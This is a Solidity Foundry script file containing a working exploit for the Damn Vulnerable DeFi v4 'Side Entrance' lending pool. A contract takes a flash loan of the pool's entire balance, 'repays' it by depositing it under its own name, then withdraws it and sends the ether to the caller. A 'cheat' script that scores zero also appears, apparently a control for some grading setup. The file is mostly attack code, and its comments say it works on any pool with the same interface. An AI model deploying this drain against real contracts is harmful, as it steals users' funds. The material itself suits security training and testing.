// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Script} from "forge-std/Script.sol";
import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../src/v4/side-entrance/SideEntranceLenderPool.sol";

/// Damn Vulnerable DeFi v4 Side Entrance, the exploit, as a Whitehat's Foundry script run by a
/// fresh account. A contract it deploys borrows the pool's whole balance, "repays" it by
/// depositing it under its own name, withdraws it, and sends it to the fresh account.
/// Env: POOL, the Side Entrance pool (unmodified or adapted: the same interface).
contract SideEntranceExploit is Script {
    function run() external {
        address pool = vm.envAddress("POOL");
        vm.startBroadcast();
        new SideEntranceAttacker(pool).attack();
        vm.stopBroadcast();
    }
}

/// The cheat: a fresh account deposits 0.5 ETH and withdraws it. Scores zero (R4.2's shape).
/// Env: POOL.
contract SideEntranceCheat is Script {
    function run() external {
        SideEntranceLenderPool pool = SideEntranceLenderPool(vm.envAddress("POOL"));
        vm.startBroadcast();
        pool.deposit{value: 0.5 ether}();
        pool.withdraw();
        vm.stopBroadcast();
    }
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable pool;
    address private immutable owner;

    constructor(address pool_) {
        pool = SideEntranceLenderPool(pool_);
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "owner only");
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "send failed");
    }

    function execute() external payable {
        require(msg.sender == address(pool), "pool only");
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
